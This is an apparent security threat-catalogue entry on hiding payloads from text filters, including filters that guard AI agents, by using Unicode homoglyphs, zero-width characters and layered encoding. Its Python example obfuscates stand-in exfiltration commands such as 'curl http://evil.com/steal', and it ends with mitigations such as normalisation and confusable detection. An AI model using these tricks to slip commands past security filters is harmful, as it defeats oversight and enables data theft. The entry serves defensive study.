---
id: "TS-2026-0073"
title: "Obfuscated Payload Delivery via Unicode and Encoding Tricks"
category: "P6"
severity: "Medium"
description: "An attacker uses Unicode homoglyphs, zero-width characters, base64 encoding chains, or other text encoding tricks to disguise malicious payloads so they evade pattern-based security filters."
date: "2026-02-26"
tags: ["evasion", "obfuscation", "unicode", "encoding", "homoglyph"]
---

## Overview

Security filters that scan for malicious patterns (URLs, shell commands, SQL injection) often operate on the literal text representation. Attackers exploit Unicode's vast character space — homoglyphs that look identical but have different codepoints, zero-width characters that break pattern matching, bidirectional text overrides that reorder displayed text, and multi-layer encoding chains — to create payloads that bypass text-based filters while remaining functional when processed by interpreters or rendered by systems that normalize Unicode.

## Attack Vector

1. Attacker takes a malicious payload (URL, command, script)
2. Characters are replaced with Unicode homoglyphs or interspersed with zero-width characters
3. The obfuscated payload passes through text-based security filters undetected
4. Target system normalizes Unicode or the interpreter handles the characters equivalently
5. The payload executes as intended despite looking different to the filter

## Impact

- **Filter bypass** — URL blocklists, command denylists, and pattern matching all defeated
- **Visual deception** — humans see what appears to be a legitimate string
- **Multi-layer evasion** — combining multiple encoding techniques compounds difficulty of detection
- **Broad applicability** — works against any text-pattern-based security mechanism

## Example

```python
# Various Unicode obfuscation techniques for evading agent security filters

def homoglyph_url(url: str) -> str:
    """Replace ASCII chars with visually identical Unicode chars."""
    # These look identical in most fonts but have different codepoints
    homoglyphs = {
        'a': 'а',  # Cyrillic 'а' (U+0430) vs Latin 'a' (U+0061)
        'e': 'е',  # Cyrillic 'е' (U+0435)
        'o': 'о',  # Cyrillic 'о' (U+043E)
        'p': 'р',  # Cyrillic 'р' (U+0440)
        'c': 'с',  # Cyrillic 'с' (U+0441)
    }
    return ''.join(homoglyphs.get(c, c) for c in url)

# "https://evil.com" with Cyrillic homoglyphs — bypasses URL blocklist
obfuscated = homoglyph_url("https://evil.com/exfil")
# Looks identical but won't match "evil.com" in a string comparison

def zero_width_bypass(command: str) -> str:
    """Insert zero-width characters to break pattern matching."""
    zwsp = '\u200b'  # Zero-Width Space
    # Insert between every character of sensitive keywords
    result = ""
    for i, c in enumerate(command):
        result += c
        if i % 3 == 0:
            result += zwsp
    return result

# "curl http://evil.com" with zero-width spaces
# Pattern matching for "curl" fails, but bash may still execute it
obfuscated_cmd = zero_width_bypass("curl http://evil.com/steal")

def nested_encoding(payload: str) -> str:
    """Multiple encoding layers to evade single-pass decoding."""
    import base64
    # Layer 1: UTF-16 encode
    step1 = payload.encode('utf-16')
    # Layer 2: Base64
    step2 = base64.b64encode(step1).decode()
    # Layer 3: URL encode
    step3 = urllib.parse.quote(step2)
    # Decoder: urllib.parse.unquote → b64decode → decode('utf-16')
    return step3
```

## Mitigation

- Normalize all Unicode text (NFKC normalization) before security scanning
- Strip zero-width and invisible characters from all inputs
- Implement multi-pass decoding (URL decode, base64, Unicode normalize) before pattern matching
- Use Unicode confusable detection (ICU confusables.txt) to flag homoglyph usage
- Apply security filters on the canonicalized form of all text
- See also: [TS-2026-0040](/skill/TS-2026-0040), [TS-2026-0072](/skill/TS-2026-0072)
